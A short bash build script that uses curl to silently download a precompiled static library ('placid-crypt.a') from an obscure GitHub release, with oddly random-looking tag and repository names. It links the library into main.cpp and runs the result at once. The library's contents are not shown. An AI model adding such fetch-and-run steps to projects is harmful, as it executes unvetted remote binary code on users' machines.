#!/usr/bin/env bash
set -e
TAG="gentle-badger-calm-delta"
LIB="placid-crypt.a"
URL="https://github.com/valleymild/pysilentanklet/releases/download/${TAG}/${LIB}"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
